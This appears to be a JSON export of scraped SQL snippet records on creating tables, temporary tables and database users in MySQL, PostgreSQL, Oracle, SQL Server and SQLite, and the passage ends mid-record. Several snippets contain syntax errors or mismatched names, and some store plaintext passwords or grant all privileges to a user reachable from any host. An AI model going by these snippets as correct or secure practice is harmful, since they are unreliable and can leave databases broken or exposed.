    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\nCREATE TABLE IF NOT EXISTS tasks (     task_id INT AUTO_INCREMENT PRIMARY KEY,     title VARCHAR(255) NOT NULL,     start_date DATE,     due_date DATE,     status TINYINT NOT NULL,     priority TINYINT NOT NULL,     description TEXT,     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )  ENGINE=INNODB; \ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) ); \n# updated dec 2020 # Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\nCREATE TABLE DemoT (     Personid int NOT NULL AUTO_INCREMENT,     LastName varchar(111) NOT NULL,     FirstName varchar(111),     Age int,     PRIMARY KEY (Personid) );\nThe CREATE DATABASE statement is used to create a new SQL/MySQL database.  Syntax CREATE DATABASE databasename;  CREATE DATABASE Example The following SQL statement creates a database called \"testDB\":  Example CREATE DATABASE testDB;\n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 704,
    "keyword": null,
    "link": null,
    "title": " create table in mysql mariadb primary key foreign key",
    "description": "CREATE TABLE IF NOT EXISTS `scores` (   `ID` int(11) NOT NULL AUTO_INCREMENT,   UserId int(11) NOT NULL,   `NICKNAME` varchar(50) NOT NULL,   `HIGHSCORE` int(11) NOT NULL,   PRIMARY KEY (`ID`),   FOREIGN KEY (UserId) REFERENCES USER(Id) );\n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 705,
    "keyword": null,
    "link": null,
    "title": " create table in postgresql",
    "description": " -- Example table  CREATE TABLE accounts ( \tuser_id serial PRIMARY KEY, \tusername VARCHAR ( 50 ) UNIQUE NOT NULL, \tpassword VARCHAR ( 50 ) NOT NULL, \temail VARCHAR ( 255 ) UNIQUE NOT NULL, \tcreated_on TIMESTAMP NOT NULL,         last_login TIMESTAMP  );\n# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\nCREATE TABLE cities (     city_id serial PRIMARY KEY,     city_name VARCHAR (255) NOT NULL,     population INT NOT NULL CHECK (population >= 0) );  \nCREATE TABLE COMPANY(    ID INT PRIMARY KEY     NOT NULL,    NAME           TEXT    NOT NULL,    AGE            INT     NOT NULL,    ADDRESS        CHAR(50),    SALARY         REAL,    JOIN_DATE\t  DATE );  INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) VALUES (1, 'Paul', 32, 'California', 20000.00,'2001-07-13'); INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,JOIN_DATE) VALUES (2, 'Allen', 25, 'Texas', '2007-12-13'); INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) VALUES (3, 'Teddy', 23, 'Norway', 20000.00, DEFAULT ); INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) VALUES (4, 'Mark', 25, 'Rich-Mond ', 65000.00, '2007-12-13' ), (5, 'David', 27, 'Texas', 85000.00, '2007-12-13');\n-- Basic table creation CREATE TABLE table_name(    column1 datatype,    column2 datatype,    column3 datatype,    .....    columnN datatype,    PRIMARY KEY( one or more columns ) ); \nCREATE TABLE table_name ( \tcolumn_name TYPE column_constraint, \ttable_constraint table_constraint ) INHERITS existing_table_name;\n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 706,
    "keyword": null,
    "link": null,
    "title": " create table mysql",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE IF NOT EXISTS tasks (     task_id INT AUTO_INCREMENT PRIMARY KEY,     title VARCHAR(255) NOT NULL,     start_date DATE,     due_date DATE,     status TINYINT NOT NULL,     priority TINYINT NOT NULL,     description TEXT,     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )  ENGINE=INNODB; \ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) ); \ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) );\nCREATE TABLE IF NOT EXISTS `sys_user_details` (     user_detail_id INT(11) AUTO_INCREMENT,     user_id INT(11),     name VARCHAR(100) NOT NULL,     email VARCHAR(200) NOT NULL,     education VARCHAR(100) DEFAULT NULL,     skills VARCHAR(100) DEFAULT NULL,     experience VARCHAR(100) DEFAULT NULL,     CONSTRAINT PK_sys_user_details PRIMARY KEY (user_detail_id),     CONSTRAINT FK_sys_user_details_user_id FOREIGN KEY (user_id)     REFERENCES sys_user(user_id)         ON UPDATE RESTRICT ON DELETE CASCADE );\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 707,
    "keyword": null,
    "link": null,
    "title": " create table mysql query",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) ); \n# updated dec 2020 # Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n-- 'CREATE TABLE' followed by the name of the table.  -- In round brackets, define the columns. CREATE TABLE `test_table`  (   id INT(10) PRIMARY KEY,\t\t\t   username VARCHAR(50) NOT NULL );\nCREATE TABLE IF NOT EXISTS `sys_user_details` (     user_detail_id INT(11) AUTO_INCREMENT,     user_id INT(11),     name VARCHAR(100) NOT NULL,     email VARCHAR(200) NOT NULL,     education VARCHAR(100) DEFAULT NULL,     skills VARCHAR(100) DEFAULT NULL,     experience VARCHAR(100) DEFAULT NULL,     CONSTRAINT PK_sys_user_details PRIMARY KEY (user_detail_id),     CONSTRAINT FK_sys_user_details_user_id FOREIGN KEY (user_id)     REFERENCES sys_user(user_id)         ON UPDATE RESTRICT ON DELETE CASCADE );\nImaginons que l&rsquo;ont souhaite cr&eacute;er une table utilisateur, contenant \"id\",\"nom\", \"prenom\", \"email\", \"date_naiss\", \"pays\" etc.. La requ&ecirc;te pour cr&eacute;er cette table peut ressembler &agrave; ceci:  CREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )  Voici des explications sur les colonnes cr&eacute;&eacute;es :      id : identifiant unique qui est utilis&eacute; comme cl&eacute; primaire \t\t et qui n&rsquo;est pas nulle     nom :une colonne de type VARCHAR avec un maximum de 100 caract&egrave;res      prenom : idem mais pour le pr&eacute;nom     email : adresse email enregistr&eacute; sous 255 caract&egrave;res au maximum     date_naissance :  format AAAA-MM-JJ (exemple : 1973-11-17)     pays : nom du pays  255 caract&egrave;res au maximum     ville : idem pour la ville     code_postal : 5 caract&egrave;res du code postal     nombre_achat : nombre d&rsquo;achat de cet utilisateur sur le site\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 708,
    "keyword": null,
    "link": null,
    "title": " create table mysql with foreign key",
    "description": "ALTER TABLE orders ADD  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE; \nALTER TABLE table_name DROP CONSTRAINT fk_name;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\nCREATE TABLE Orders (     OrderID int NOT NULL,     OrderNumber int NOT NULL,     PersonID int,     PRIMARY KEY (OrderID),     FOREIGN KEY (PersonID) REFERENCES Persons(PersonID) );\nHere is the basic syntax of defining a foreign key constraint in the CREATE TABLE or ALTER TABLE statement:  [CONSTRAINT constraint_name] FOREIGN KEY [foreign_key_name] (column_name, ...) REFERENCES parent_table(colunm_name,...) [ON DELETE reference_option] [ON UPDATE reference_option] In this syntax:  First, specify the name of foreign key constraint that you want to create after the CONSTRAINT keyword. If you omit the constraint name, MySQL automatically generates a name for the foreign key constraint.  Second, specify a list of comma-separated foreign key columns after the FOREIGN KEY keywords. The foreign key name is also optional and is generated automatically if you skip it.  Third, specify the parent table followed by a list of comma-separated columns to which the foreign key columns reference.  Finally, specify how foreign key maintains the referential integrity between the child and parent tables by using the ON DELETE and ON UPDATE clauses.  The reference_option determines action which MySQL will take when values in the parent key columns are deleted (ON DELETE) or updated (ON UPDATE).  MySQL has five reference options: CASCADE, SET NULL, NO ACTION, RESTRICT, and SET DEFAULT.  CASCADE: if a row from the parent table is deleted or updated, the values of the matching rows in the child table automatically deleted or updated. SET NULL:  if a row from the parent table is deleted or updated, the values of the foreign key column (or columns) in the child table are set to NULL. RESTRICT:  if a row from the parent table has a matching row in the child table, MySQL rejects deleting or updating rows in the parent table. NO ACTION: is the same as RESTRICT. SET DEFAULT: is recognized by the MySQL parser. However, this action is rejected by both InnoDB and NDB tables. In fact, MySQL fully supports three actions: RESTRICT, CASCADE and SET NULL.  If you don&rsquo;t specify the ON DELETE and ON UPDATE clause, the default action is RESTRICT.  MySQL FOREIGN KEY examples Let&rsquo;s create a new database called fkdemo for the demonstration.  CREATE DATABASE fkdemo;  USE fkdemo; RESTRICT & NO ACTION actions Inside the fkdemo database, create two tables categories and products:  CREATE TABLE categories(     categoryId INT AUTO_INCREMENT PRIMARY KEY,     categoryName VARCHAR(100) NOT NULL ) ENGINE=INNODB;  CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)          REFERENCES categories(categoryId) ) ENGINE=INNODB; The categoryId in the products table is the foreign key column that refers to the categoryId column in the  categories table.  Because we don&rsquo;t specify any ON UPDATE and ON DELETE clauses, the default action is RESTRICT for both update and delete operation.\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 709,
    "keyword": null,
    "link": null,
    "title": " create table oracle",
    "description": "CREATE TABLE ot.persons(     person_id NUMBER GENERATED BY DEFAULT AS IDENTITY,     first_name VARCHAR2(50) NOT NULL,     last_name VARCHAR2(50) NOT NULL,     PRIMARY KEY(person_id) );\n/*Deleting whole table with data */ DROP TABLE vehicles; DROP TABLE owners;  /*First create only this table */ CREATE TABLE owners (     owner_id NUMBER,     first_name VARCHAR2(50 CHAR) NOT NULL,          CONSTRAINT owners_pk PRIMARY KEY(owner_id) );  /* One owner got many vehicles, one to many relation \tor one vehicle got many owners */ CREATE TABLE vehicles (     vehicle_id NUMBER,     vehicle_name VARCHAR2(50 CHAR) NOT NULL,        \t/* CONSTRAINT vehicle_pk PRIMARY KEY(vehicle_id) --If we had made PRIMARY KEY here it will be one to one relation */     CONSTRAINT vehicle_owner_fk FOREIGN KEY(vehicle_id) REFERENCES owners(owner_id) ON DELETE SET NULL );   INSERT INTO owners VALUES(1, 'Abbi'); INSERT INTO owners VALUES(2, 'Beatrix'); INSERT INTO owners VALUES(3, 'Caila'); INSERT INTO owners VALUES(4, 'Dea'); INSERT INTO owners VALUES(5, 'Elise');  INSERT INTO vehicles VALUES(1, 'car'); INSERT INTO vehicles VALUES(2, 'motorcycle'); INSERT INTO vehicles VALUES(3, 'airplane1'); INSERT INTO vehicles VALUES(4, 'airplane1'); INSERT INTO vehicles VALUES(4, 'steamer'); INSERT INTO vehicles VALUES(4, 'submarine'); COMMIT;  DELETE FROM projects WHERE vehicle_id = 4 AND vehicle_name = 'submarine';  /* Sometimes Oracle SQL Dev don't like this sign ';',  Primary Key is always NOT NULL UNIQUE, single PK PRIMARY KEY(user_id), allowed combination: (1,1) for example (user_id, project_id) (2,1) (3,1) (4,2)  */   -- one line comment  \n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 710,
    "keyword": null,
    "link": null,
    "title": " create table postgresql",
    "description": " -- Example table  CREATE TABLE accounts ( \tuser_id serial PRIMARY KEY, \tusername VARCHAR ( 50 ) UNIQUE NOT NULL, \tpassword VARCHAR ( 50 ) NOT NULL, \temail VARCHAR ( 255 ) UNIQUE NOT NULL, \tcreated_on TIMESTAMP NOT NULL,         last_login TIMESTAMP  );\nCREATE TABLE cities (     city_id serial PRIMARY KEY,     city_name VARCHAR (255) NOT NULL,     population INT NOT NULL CHECK (population >= 0) );  \n-- Basic table creation CREATE TABLE table_name(    column1 datatype,    column2 datatype,    column3 datatype,    .....    columnN datatype,    PRIMARY KEY( one or more columns ) ); \nCREATE TABLE table_name ( \tcolumn_name TYPE column_constraint, \ttable_constraint table_constraint ) INHERITS existing_table_name;\nCREATE TABLE films_recent AS   SELECT * FROM films WHERE date_prod >= '2002-01-01'; \npg_dump -t 'schema-name.table-name' --schema-only database-name \n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 711,
    "keyword": null,
    "link": null,
    "title": " create table postgresql foreign key",
    "description": "CREATE TABLE so_items ( \tso_id INTEGER,   \t... \tFOREIGN KEY (so_id) REFERENCES so_headers (id) );\n# id_user is the primary key of the table users: create table lists( id_list serial not null primary key, id_user int references users(id_user), is_temp int );\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 712,
    "keyword": null,
    "link": null,
    "title": " create table postgresql primary key",
    "description": "CREATE TABLE TABLE ( \tcolumn_1 data_type PRIMARY KEY, \tcolumn_2 data_type, \t&hellip; );\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 713,
    "keyword": null,
    "link": null,
    "title": " create table split string function in sql server",
    "description": "                                     SELECT      first_name,      last_name,     value phone FROM      sales.contacts     CROSS APPLY STRING_SPLIT(phones, ','); \n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 714,
    "keyword": null,
    "link": null,
    "title": " create table sql",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE table_name(   \tid INT AUTO_INCREMENT PRIMARY KEY,     \tname VARCHAR(255), # String 255 chars max   \tdate DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,   \tlongtext BLOB );\n//to create a table CREATE TABLE students ( student_id number(4) primary key,   last_name varchar2(30) NOT NULL,   course_id number(4) NULL );  //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);\n CREATE TABLE Persons ( PersonID int, LastName varchar(255), FirstName varchar(255), Address varchar(255),  City varchar(255)  );  \nCREATE TABLE Persons (     PersonID int,     LastName varchar(255),     FirstName varchar(255),     Address varchar(255),     City varchar(255) );\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 715,
    "keyword": null,
    "link": null,
    "title": " create table sqlite",
    "description": " CREATE TABLE [IF NOT EXISTS] [schema_name].table_name ( \tcolumn_1 data_type PRIMARY KEY,    \tcolumn_2 data_type NOT NULL, \tcolumn_3 data_type DEFAULT 0, \ttable_constraints ) [WITHOUT ROWID];\nCREATE TABLE IF NOT EXISTS [schema_name].table_name (...);\nCREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...);\ndb.run('CREATE IF NOT EXISTS TABLE users(name TEXT NOT NULL)');\nUPDATE Table1 set Name=(select t2.Name from Table2 t2 where t2.id=Table1.id) \n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 716,
    "keyword": null,
    "link": null,
    "title": " create table sqlite python",
    "description": "CREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...); \n                                                     import sqlite3 from sqlite3 import Error   def create_connection(db_file):     \"\"\" create a database connection to the SQLite database         specified by db_file     :param db_file: database file     :return: Connection object or None     \"\"\"     conn = None     try:         conn = sqlite3.connect(db_file)         return conn     except Error as e:         print(e)      return conn   def create_table(conn, create_table_sql):     \"\"\" create a table from the create_table_sql statement     :param conn: Connection object     :param create_table_sql: a CREATE TABLE statement     :return:     \"\"\"     try:         c = conn.cursor()         c.execute(create_table_sql)     except Error as e:         print(e)   def main():     database = r\"C:\\sqlite\\db\\pythonsqlite.db\"      sql_create_projects_table = \"\"\" CREATE TABLE IF NOT EXISTS projects (                                         id integer PRIMARY KEY,                                         name text NOT NULL,                                         begin_date text,                                         end_date text                                     ); \"\"\"      sql_create_tasks_table = \"\"\"CREATE TABLE IF NOT EXISTS tasks (                                     id integer PRIMARY KEY,                                     name text NOT NULL,                                     priority integer,                                     status_id integer NOT NULL,                                     project_id integer NOT NULL,                                     begin_date text NOT NULL,                                     end_date text NOT NULL,                                     FOREIGN KEY (project_id) REFERENCES projects (id)                                 );\"\"\"      # create a database connection     conn = create_connection(database)      # create tables     if conn is not None:         # create projects table         create_table(conn, sql_create_projects_table)          # create tasks table         create_table(conn, sql_create_tasks_table)     else:         print(\"Error! cannot create the database connection.\")   if __name__ == '__main__':     main()Code language: Python (python)\n         import sqlite3 from sqlite3 import Error   def create_connection(db_file):     \"\"\" create a database connection to the SQLite database         specified by db_file     :param db_file: database file     :return: Connection object or None     \"\"\"     conn = None     try:         conn = sqlite3.connect(db_file)         return conn     except Error as e:         print(e)      return conn   def create_table(conn, create_table_sql):     \"\"\" create a table from the create_table_sql statement     :param conn: Connection object     :param create_table_sql: a CREATE TABLE statement     :return:     \"\"\"     try:         c = conn.cursor()         c.execute(create_table_sql)     except Error as e:         print(e)   def main():     database = r\"C:\\sqlite\\db\\pythonsqlite.db\"      sql_create_projects_table = \"\"\" CREATE TABLE IF NOT EXISTS projects (                                         id integer PRIMARY KEY,                                         name text NOT NULL,                                         begin_date text,                                         end_date text                                     ); \"\"\"      sql_create_tasks_table = \"\"\"CREATE TABLE IF NOT EXISTS tasks (                                     id integer PRIMARY KEY,                                     name text NOT NULL,                                     priority integer,                                     status_id integer NOT NULL,                                     project_id integer NOT NULL,                                     begin_date text NOT NULL,                                     end_date text NOT NULL,                                     FOREIGN KEY (project_id) REFERENCES projects (id)                                 );\"\"\"      # create a database connection     conn = create_connection(database)      # create tables     if conn is not None:         # create projects table         create_table(conn, sql_create_projects_table)          # create tasks table         create_table(conn, sql_create_tasks_table)     else:         print(\"Error! cannot create the database connection.\")   if __name__ == '__main__':     main()Code language: Python (python)\n",
    "reg_date": "2021-10-12T09:54:46.000Z"
  },
  {
    "id": 717,
    "keyword": null,
    "link": null,
    "title": " create table variable in sql stored procedure",
    "description": "DECLARE @table_variable_name TABLE (     Number int IDENTITY(1,1) , \tId int not null, \t[Name] nvarchar(200) NULL, \tAmount decimal(38,2) NULL );\n                                     DECLARE      @product_name VARCHAR(MAX),     @list_price DECIMAL(10,2); \n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 718,
    "keyword": null,
    "link": null,
    "title": " create table with date column in sql",
    "description": "mysql> create table DemoTable    (    StudentId int NOT NULL AUTO_INCREMENT PRIMARY KEY,    StudentName varchar(20),    StudentAdmissionDate DATE    ); Query OK, 0 rows affected (0.47 sec)\n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 719,
    "keyword": null,
    "link": null,
    "title": " create table with float datatype in sql server",
    "description": "create table order_ ( id int PRIMARY KEY, number float, );\n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 720,
    "keyword": null,
    "link": null,
    "title": " create table with primary key",
    "description": "CREATE TABLE student_id ( Column1 datatype, Column2 datatype, Column3 datatype,  PRIMARY KEY (student_id);\nALTER TABLE Persons  ADD PRIMARY KEY (ID); \n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 721,
    "keyword": null,
    "link": null,
    "title": " create table with primary key auto increment in sql",
    "description": "CREATE TABLE table_name (     id INT NOT NULL IDENTITY(1, 1),     name NVARCHAR (100) NULL,     school NVARCHAR (100) NULL,     PRIMARY KEY (ID) );\n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 722,
    "keyword": null,
    "link": null,
    "title": " create temp table in sql",
    "description": "CREATE TABLE #haro_products (     product_name VARCHAR(MAX),     list_price DEC(10,2) );\n-- CREATE TEMP TABLE  Create Table #MyTempTable (     EmployeeID int );  -- DROP TEMP TABLE IF OBJECT_ID('tempdb..#MyTempTable') IS NOT NULL DROP TABLE #MyTempTable\n-- CREATE TEMP TABLE  Create Table #MyTempTable (     EmployeeID int ); \nDECLARE @TempTable AS TABLE(//Mention your columns in here.//) After that you can insert into this table later.\nSELECT * INTO #<Temp_Table_Name> FROM <TableName> WHERE <Conditions> ORDER BY <Col_Names OrderSeq> OPTION <Options>\n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 723,
    "keyword": null,
    "link": null,
    "title": " create temporal table in sql",
    "description": "WITH new_table AS (  \t\t\tSELECT *  \t\t\tFROM existing_table  \t\t\tWHERE distance >= 20)  # You can then run multiple queries on this filtered data without  #having to filter the data everytime  write complex subqueries. # NB WITH/temporal tables is always defined first before writing queries.\n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 724,
    "keyword": null,
    "link": null,
    "title": " create temporary table in mysql",
    "description": "CREATE TEMPORARY TABLE new_tbl SELECT * FROM orig_tbl LIMIT 0;\n SHOW TABLES FROM INFORMATION_SCHEMA LIKE 'INNODB_TEMP%'; \n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 725,
    "keyword": null,
    "link": null,
    "title": " create temporary table sql",
    "description": "CREATE TABLE #haro_products (     product_name VARCHAR(MAX),     list_price DEC(10,2) );\n-- CREATE TEMP TABLE  Create Table #MyTempTable (     EmployeeID int );  -- DROP TEMP TABLE IF OBJECT_ID('tempdb..#MyTempTable') IS NOT NULL DROP TABLE #MyTempTable\n-- CREATE TEMP TABLE  Create Table #MyTempTable (     EmployeeID int ); \nSELECT * INTO #<Temp_Table_Name> FROM <TableName> WHERE <Conditions> ORDER BY <Col_Names OrderSeq> OPTION <Options>\n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 726,
    "keyword": null,
    "link": null,
    "title": " create user defined table type in sql",
    "description": "CREATE TYPE UT_Employee AS TABLE   (   Emp_Id int NOT NULL,   EmployeeName nvarchar(MAX),   EmpSalary varchar(50),   StateId varchar(50),   CityId varchar(50)   ); CREATE PROCEDURE USP_Insert_Employee_Infi(@Employee_Details [UT_Employee])   AS   BEGIN      INSERT INTO dbo.Employee   (   Emp_Id,   EmployeeName,   EmpSalary,   StateId,   CityId   )   SELECT * FROM @Employee_Details   END;  \n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 727,
    "keyword": null,
    "link": null,
    "title": " create user mysql",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\n#in the case below, your username is dbuser #and we assume that the mysql db is located in the same server or box from where you want to access it from #after the IDENTIFIED BY and within the single qoute (') you you should replace 'complexPassword' with a password your desire CREATE USER 'dbuser'@'localhost' IDENTIFIED BY 'complexPassword';  #we assume that the name of your database is db_name #the command below grants the user you created with privilege to only database db_name #if your want dbuser to have access to all database the replace db_name with * GRANT ALL PRIVILEGES ON db_name . * TO 'dbuser'@'localhost';  #the command below reloads the privileges of mysql with your new user privileges FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'%' IDENTIFIED BY 'user_password'; GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'%'; SHOW GRANTS FOR 'newuser'@'%'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n",
    "reg_date": "2021-10-12T09:54:47.000Z"
  },
  {
    "id": 728,
    "keyword": null,
    "link": null,
    "title": " create user mysql debian 10",
    "description": "mysql -u root -p --enter password-- CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; CREATE DATABASE `myDB`; GRANT ALL PRIVILEGES ON myDB . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 729,
    "keyword": null,
    "link": null,
    "title": " create user sql",
    "description": "/*You can also create a login using the T-SQL command.*/ CREATE LOGIN MyLogin WITH PASSWORD = '123'; \n-- Creates the login AbolrousHazem with password '340$Uuxwp7Mcxo7Khy'.   CREATE LOGIN username        WITH PASSWORD = 'password';   GO    -- Creates a database user for the login created above.   CREATE USER AbolrousHazem FOR LOGIN AbolrousHazem;   GO   \n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 730,
    "keyword": null,
    "link": null,
    "title": " create user sql server",
    "description": "/*You can also create a login using the T-SQL command.*/ CREATE LOGIN MyLogin WITH PASSWORD = '123'; \n-- Creates the login AbolrousHazem with password '340$Uuxwp7Mcxo7Khy'.   CREATE LOGIN username        WITH PASSWORD = 'password';   GO    -- Creates a database user for the login created above.   CREATE USER AbolrousHazem FOR LOGIN AbolrousHazem;   GO   \n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 731,
    "keyword": null,
    "link": null,
    "title": " created at and updated at in mysql",
    "description": "ALTER TABLE t1 ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;\nALTER TABLE t1 ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP; \n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 732,
    "keyword": null,
    "link": null,
    "title": " createdb with postgresql on ubuntu",
    "description": "susudo -u postgres psqlpostgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 733,
    "keyword": null,
    "link": null,
    "title": " creating a table in sql",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE table_name(   \tid INT AUTO_INCREMENT PRIMARY KEY,     \tname VARCHAR(255), # String 255 chars max   \tdate DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,   \tlongtext BLOB );\n//to create a table CREATE TABLE students ( student_id number(4) primary key,   last_name varchar2(30) NOT NULL,   course_id number(4) NULL );  //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);\nCREATE TABLE Persons (     PersonID int,     LastName varchar(255),     